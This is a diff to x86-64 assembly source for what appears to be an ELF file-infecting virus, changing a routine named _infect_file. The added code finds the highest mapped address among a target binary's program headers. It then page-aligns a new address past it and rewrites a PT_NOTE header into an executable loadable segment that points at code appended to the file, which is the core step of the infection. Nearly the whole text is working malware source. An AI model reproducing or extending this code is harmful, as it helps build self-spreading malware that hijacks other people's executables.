@@ -782,6 +782,25 @@ _infect_file: ; (string rdi, stat rsi)
 			jmp .find_segment_exec
 ; = test
 		.get_segment_note:
+			; get max vaddr
+			xor rsi, rsi; max
+			xor rcx, rcx
+			mov rbx, r13
+			add rbx, [r13 + E_PHOFF]; e_phoff
+			.find_max:
+				inc rcx
+				cmp rcx, rax
+				jge .found_max
+				mov rdx, [rbx + P_VADDR]
+				add rdx, [rbx + P_MEMSZ]
+				cmp rsi, rdx
+				jge .continue
+				push rdx
+				pop rsi
+				.continue:
+				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
+				jmp .find_max
+			.found_max:
 			xor rcx, rcx
 			mov rbx, r13
 			add rbx, [r13 + E_PHOFF]; e_phoff
@@ -793,6 +812,7 @@ _infect_file: ; (string rdi, stat rsi)
 			jne .nnext
 			; FOUND !
 			; map
+			push rsi
 			push r8
 			push r10
 			xor rdi, rdi
@@ -812,6 +832,7 @@ _infect_file: ; (string rdi, stat rsi)
 			pop r11
 			pop r10
 			pop r8
+			pop rsi
 
 			sub rbx, r13
 			push r13
@@ -822,8 +843,22 @@ _infect_file: ; (string rdi, stat rsi)
 			mov dword[rbx + P_FLAGS], 5; PF_X | PF_R
 			mov rax, [r12 + ST_SIZE]
 			mov [rbx + P_OFFSET], rax
-;			mov [rbx + P_VADDR], 
+			xor rdx, rdx
+			push 0x1000
+			pop rcx
+			div rcx
+			push rsi
+			pop rax
+			div rcx
+			inc rax
+			mul rcx
+			add rax, rdx
 
+			mov [rbx + P_VADDR], rax
+			mov [rbx + P_PADDR], rax
+			mov [rbx + P_FILESZ], r14
+			mov [rbx + P_MEMSZ], r14
+			mov qword[rbx + P_ALIGN], 0x1000
 ;			push r11
 ;			push 1
 ;			pop r11; mode PT_NOTE
